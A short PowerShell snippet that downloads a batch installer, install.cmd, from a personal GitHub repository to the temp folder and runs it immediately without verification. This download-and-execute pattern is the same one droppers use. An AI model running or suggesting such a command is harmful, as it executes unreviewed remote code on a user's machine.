# Download and run the batch installer instead
$cmdUrl = 'https://raw.githubusercontent.com/kk70226581/rd-files/main/install.cmd'
$cmdPath = "$env:TEMP\install.cmd"
(New-Object Net.WebClient).DownloadFile($cmdUrl, $cmdPath)
& $cmdPath
